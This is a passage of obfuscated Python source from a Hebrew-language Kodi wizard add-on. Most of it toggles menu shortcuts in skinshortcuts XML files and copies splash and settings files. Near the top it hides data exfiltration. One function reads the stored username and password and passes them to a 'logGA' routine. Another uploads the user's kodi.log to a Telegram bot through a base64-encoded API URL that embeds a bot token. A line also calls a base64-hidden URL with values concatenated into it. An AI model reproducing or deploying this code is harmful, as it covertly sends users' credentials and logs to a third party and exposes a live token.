          OO0O000OOO0000OO0 =urllib2 .urlopen (O0OO0O0O0O0000O00 .decode ('base64')+' - '+OOOO0OOO0O00O0000 +' - '+O0O0OO000O0000OOO +' - '+OOO0O0O0O0O00O00O ).readlines ()#line:578
       except :pass #line:579
def googleindicat ():#line:582
			import logg #line:583
			OOOO0OO0000000O00 =(ADDON .getSetting ("pass"))#line:584
			O00OOO0OO0000O00O =(ADDON .getSetting ("user"))#line:585
			logg .logGA (OOOO0OO0000000O00 ,O00OOO0OO0000O00O )#line:586
def logsend ():#line:587
      if not os .path .exists (xbmc .translatePath ("special://home/addons/")+'script.module.requests'):#line:588
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:589
      howsentlog ()#line:591
      import requests #line:592
      if xbmc .getCondVisibility ('system.platform.windows'):#line:593
         O0O0O000OO000OO00 =xbmc .translatePath ('special://home/kodi.log')#line:594
         O000OOOO0O0000000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O000OO000OO00 ,open (O0O0O000OO000OO00 ,'rb')),}#line:598
         O00OO00000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:599
         OOOOO00O0OOO00OOO =requests .post (O00OO00000000OO00 .decode ('base64'),files =O000OOOO0O0000000 )#line:601
      elif xbmc .getCondVisibility ('system.platform.android'):#line:602
           O0O0O000OO000OO00 =xbmc .translatePath ('special://temp/kodi.log')#line:603
           O000OOOO0O0000000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O000OO000OO00 ,open (O0O0O000OO000OO00 ,'rb')),}#line:607
           O00OO00000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:608
           OOOOO00O0OOO00OOO =requests .post (O00OO00000000OO00 .decode ('base64'),files =O000OOOO0O0000000 )#line:610
      else :#line:611
           O0O0O000OO000OO00 =xbmc .translatePath ('special://kodi.log')#line:612
           O000OOOO0O0000000 ={'chat_id':(None ,'-274262389'),'document':(O0O0O000OO000OO00 ,open (O0O0O000OO000OO00 ,'rb')),}#line:616
           O00OO00000000OO00 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:617
           OOOOO00O0OOO00OOO =requests .post (O00OO00000000OO00 .decode ('base64'),files =O000OOOO0O0000000 )#line:619
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:620
def rdoff ():#line:622
	OO0OO0O00OO0OO0OO =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:653
	OO0O00O0O0O0O0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:654
	copyfile (OO0OO0O00OO0OO0OO ,OO0O00O0O0O0O0OO0 )#line:655
def skindialogsettind18 ():#line:656
	try :#line:657
		O0OO0OOOO0OOOO0O0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:658
		O0OOOO0O0OOOO0O00 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:659
		copyfile (O0OO0OOOO0OOOO0O0 ,O0OOOO0O0OOOO0O00 )#line:660
	except :pass #line:661
def rdon ():#line:662
	loginit .loginIt ('restore','all')#line:663
	OOOOOO0O000O0O0OO =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:665
	OO0O000OOO0OO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:666
	copyfile (OOOOOO0O000O0O0OO ,OO0O000OOO0OO0OO0 )#line:667
def adults18 ():#line:669
  O0O0OOO00OO0OO00O =(ADDON .getSetting ("adults"))#line:670
  if O0O0OOO00OO0OO00O =='true':#line:671
    OOOOOO0000O00OOO0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:672
    with open (OOOOOO0000O00OOO0 ,'r')as OOO0O0000O00000OO :#line:673
      O00OOOOOO0O00O0OO =OOO0O0000O00000OO .read ()#line:674
    O00OOOOOO0O00O0OO =O00OOOOOO0O00O0OO .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:692
    with open (OOOOOO0000O00OOO0 ,'w')as OOO0O0000O00000OO :#line:695
      OOO0O0000O00000OO .write (O00OOOOOO0O00O0OO )#line:696
def rdbuildaddon ():#line:697
  OO00OOOOO000O00OO =(ADDON .getSetting ("auto_rd"))#line:698
  if OO00OOOOO000O00OO =='true':#line:699
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:700
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:701
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:702
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:720
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:723
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:724
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:728
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:729
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:730
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:748
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:751
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:752
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:756
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:757
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:758
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:776
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:779
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:780
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:784
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:785
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:786
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:804
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:807
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:808
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:811
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:812
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:813
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:831
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:834
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:835
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:837
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:838
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:839
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:857
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:860
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:861
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:863
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:864
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:865
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:883
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:886
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:887
    O00O000O00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:890
    with open (O00O000O00OO0OOOO ,'r')as OO0OOO000O00O00OO :#line:891
      OOO0OOOO00O0O00O0 =OO0OOO000O00O00OO .read ()#line:892
    OOO0OOOO00O0O00O0 =OOO0OOOO00O0O00O0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:910
    with open (O00O000O00OO0OOOO ,'w')as OO0OOO000O00O00OO :#line:913
      OO0OOO000O00O00OO .write (OOO0OOOO00O0O00O0 )#line:914
def rdbuildinstall ():#line:917
  try :#line:918
   O0OOOOOO000O00O0O =(ADDON .getSetting ("auto_rd"))#line:919
   if O0OOOOOO000O00O0O =='true':#line:920
     O00OOO0O000OOO000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:921
     O00OO000OOO0OO0OO =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:922
     copyfile (O00OOO0O000OOO000 ,O00OO000OOO0OO0OO )#line:923
  except :#line:924
     pass #line:925
def rdbuildaddonoff ():#line:928
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:931
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:932
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:933
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:951
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:954
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:955
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:959
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:960
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:961
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:979
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:982
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:983
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:987
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:988
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:989
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1007
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1010
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1011
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1015
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:1016
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:1017
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1035
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1038
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1039
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1042
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:1043
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:1044
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1062
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1065
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1066
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1068
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:1069
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:1070
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1088
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1091
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1092
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1094
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:1095
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:1096
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1114
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1117
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1118
    OOO0O00000OOOOOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1121
    with open (OOO0O00000OOOOOOO ,'r')as OOOOOO00O000O0OO0 :#line:1122
      O0O0O0O0O0000OOO0 =OOOOOO00O000O0OO0 .read ()#line:1123
    O0O0O0O0O0000OOO0 =O0O0O0O0O0000OOO0 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1141
    with open (OOO0O00000OOOOOOO ,'w')as OOOOOO00O000O0OO0 :#line:1144
      OOOOOO00O000O0OO0 .write (O0O0O0O0O0000OOO0 )#line:1145
def rdbuildinstalloff ():#line:1148
    try :#line:1149
       OOO00000000OO00O0 =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1150
       OOOO00O0O0O0O000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1151
       copyfile (OOO00000000OO00O0 ,OOOO00O0O0O0O000O )#line:1153
       OOO00000000OO00O0 =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1155
       OOOO00O0O0O0O000O =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1156
       copyfile (OOO00000000OO00O0 ,OOOO00O0O0O0O000O )#line:1158
       OOO00000000OO00O0 =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1160
       OOOO00O0O0O0O000O =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1161
       copyfile (OOO00000000OO00O0 ,OOOO00O0O0O0O000O )#line:1163
       OOO00000000OO00O0 =ADDONPATH +"/resources/rdoff/Splash.png"#line:1166
       OOOO00O0O0O0O000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1167
       copyfile (OOO00000000OO00O0 ,OOOO00O0O0O0O000O )#line:1169
    except :#line:1171
       pass #line:1172
def rdbuildaddonON ():#line:1179
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1181
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1182
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1183
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1201
    with open (OO00O0O0OOOO0O000 ,'w')as OO0OO000O0OOOO00O :#line:1204
      OO0OO000O0OOOO00O .write (OOOOO0OOOOOOOOO0O )#line:1205
    OO00O0O0OOOO0O000 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1209
    with open (OO00O0O0OOOO0O000 ,'r')as OO0OO000O0OOOO00O :#line:1210
      OOOOO0OOOOOOOOO0O =OO0OO000O0OOOO00O .read ()#line:1211
    OOOOO0OOOOOOOOO0O =OOOOO0OOOOOOOOO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
